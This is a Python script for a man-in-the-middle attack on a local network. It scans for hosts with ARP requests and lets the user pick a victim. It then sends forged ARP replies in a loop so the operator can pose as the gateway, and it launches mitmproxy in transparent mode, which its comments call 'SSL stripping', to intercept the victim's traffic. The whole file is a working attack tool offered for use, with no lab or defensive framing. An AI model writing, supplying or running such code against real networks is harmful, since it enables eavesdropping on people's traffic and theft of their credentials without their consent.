import os
import subprocess
import scapy.all as scapy
import time
import mitmproxy

# Network scanner
def scan_the_network(interface):
    network_range = input("Enter the network range (e.g., 192.168.1.0/24): ")

    arp_request = scapy.ARP(pdst=network_range)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request

    answered_list = scapy.srp(combined_packet, iface=interface, timeout=1, verbose=False)[0]

    device_list = []
    for item in answered_list:
        device_dict = {"ip": item[1].psrc, "mac": item[1].hwsrc}
        device_list.append(device_dict)

    return device_list

# Device display
def display_devices(devices):
    print("\n- List of Devices -")
    for i, device in enumerate(devices, start=1):
        print(f"{i}. IP: {device['ip']} - MAC: {device['mac']}")
    print("")

# Mac Address retriever
def get_target_mac(target_ip, interface):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request

    answered_list = scapy.srp(combined_packet, iface=interface, timeout=1, verbose=False)[0]

    for item in answered_list:
        if item[1].psrc == target_ip:
            return item[1].hwsrc
    return None

# ARP Poisoner
def arp_poisoner(devices, interface):
    selected_device = input("Enter the number of the device to impersonate as the default gateway (e.g., 2): ")
    try:
        selected_device = int(selected_device)
        if 1 <= selected_device <= len(devices):
            target_ip = devices[selected_device - 1]["ip"]
            target_mac = get_target_mac(target_ip, interface)

            if not target_mac:
                print("[!] Could not retrieve MAC address for target.")
                return

            print("\n[*] ARP Poisoner is running. You're now the default gateway for the selected device!\n")

            # Start mitmproxy for SSL stripping
            start_mitmproxy()

            while True:
                try:
                    arp_response_gateway = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=devices[0]["ip"])
                    arp_response_target = scapy.ARP(op=2, pdst=devices[0]["ip"], hwdst=devices[0]["mac"], psrc=target_ip)

                    scapy.send(arp_response_gateway, verbose=False)
                    scapy.send(arp_response_target, verbose=False)

                    time.sleep(2)
                except KeyboardInterrupt:
                    print("\n[!] Quitting spoof.")
                    print("[*] Resetting ARP tables.")
                    reset_arps(devices, interface)
                    stop_mitmproxy()
                    break
        else:
            print("[!] Invalid device number.")
    except ValueError:
        print("[!] Invalid input. Enter a number.")

# ARP reset
def reset_arps(devices, interface):
    for device in devices:
        if device["ip"] != devices[0]["ip"]:
            arp_response = scapy.ARP(op=2, pdst=device["ip"], hwdst=device["mac"], psrc=devices[0]["ip"])
            scapy.send(arp_response, iface=interface, verbose=False)

# Start mitmproxy for SSL stripping
def start_mitmproxy():
    try:
        # Start mitmproxy in a subprocess to handle SSL stripping
        global mitmproxy_process
        mitmproxy_process = subprocess.Popen(["mitmproxy", "--mode", "transparent", "--ssl-insecure"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] mitmproxy started for SSL stripping.")
    except Exception as e:
        print(f"[!] Failed to start mitmproxy: {str(e)}")

# Stop mitmproxy
def stop_mitmproxy():
    try:
        mitmproxy_process.terminate()
        mitmproxy_process.wait()
        print("[*] mitmproxy stopped.")
    except Exception as e:
        print(f"[!] Failed to stop mitmproxy: {str(e)}")

if __name__ == "__main__":
    interface = input("Enter your network interface (e.g., wlan0): ")
    devices = scan_the_network(interface)
    display_devices(devices)
    arp_poisoner(devices, interface)

